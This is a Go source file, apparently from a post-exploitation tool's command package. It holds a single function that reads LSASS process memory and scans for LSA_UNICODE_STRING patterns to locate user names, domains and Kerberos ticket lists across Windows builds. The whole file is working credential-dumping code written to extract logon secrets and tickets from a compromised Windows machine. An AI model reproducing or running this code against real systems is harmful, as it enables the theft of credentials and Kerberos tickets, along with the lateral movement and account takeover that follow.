//go:build windows
// +build windows

package commands

import (
	"encoding/binary"
	"fmt"
)

// probeKerbSessionLayout reads raw session bytes and scans for
// LSA_UNICODE_STRING patterns to auto-detect the credentials offset.
// This handles build-specific variations in the session struct that differ
// across Windows cumulative updates.
// Returns an adjusted layout if valid LSA_UNICODE_STRINGs are found.
func probeKerbSessionLayout(r lsassReader, sessionBase uintptr, base kerbSessionLayout) kerbSessionLayout {
	probeSize := uint32(0x200)
	raw, err := r.Read(sessionBase, probeSize)
	if err != nil || len(raw) < 0x100 {
		return base
	}

	type uniCandidate struct {
		off    int
		length uint16
		bufPtr uintptr
	}

	var candidates []uniCandidate
	for off := 0; off+16 <= len(raw); off += 8 {
		length := binary.LittleEndian.Uint16(raw[off : off+2])
		maxLen := binary.LittleEndian.Uint16(raw[off+2 : off+4])
		bufPtr := uintptr(binary.LittleEndian.Uint64(raw[off+8 : off+16]))

		if length == 0 || length > 1024 || length%2 != 0 {
			continue
		}
		if maxLen < length {
			continue
		}
		if bufPtr == 0 {
			continue
		}

		candidates = append(candidates, uniCandidate{off, length, bufPtr})
	}

	for i := 0; i+1 < len(candidates); i++ {
		a, b := candidates[i], candidates[i+1]
		if b.off-a.off != 16 {
			continue
		}

		str, sErr := readRemoteLSAUnicodeString(r, raw[a.off:a.off+16])
		if sErr != nil || str == "" {
			continue
		}

		userOff := a.off
		domOff := b.off

		ticketsBase := userOff + 0x58

		adjusted := base
		adjusted.Name = fmt.Sprintf("%s_probed_u%02X", base.Name, userOff)
		adjusted.UserNameOff = userOff
		adjusted.DomainOff = domOff
		adjusted.Tickets1Off = ticketsBase
		adjusted.Tickets2Off = ticketsBase + 0x10
		adjusted.Tickets3Off = ticketsBase + 0x20
		adjusted.NodeReadSize = ticketsBase + 0x38
		if adjusted.NodeReadSize < base.NodeReadSize {
			adjusted.NodeReadSize = base.NodeReadSize
		}
		return adjusted
	}

	return base
}
